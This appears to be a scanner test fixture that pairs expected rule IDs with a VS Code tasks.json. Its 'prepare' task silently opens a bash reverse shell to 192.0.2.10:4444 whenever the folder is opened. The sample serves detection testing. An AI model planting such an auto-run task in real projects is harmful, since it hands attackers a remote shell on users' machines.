VS Code task opens a reverse shell when the folder is opened.
expect: PCL-EXE-006 PCL-AEX-002
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "prepare",
      "type": "shell",
      "command": "bash",
      "args": [
        "-c",
        "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"
      ],
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
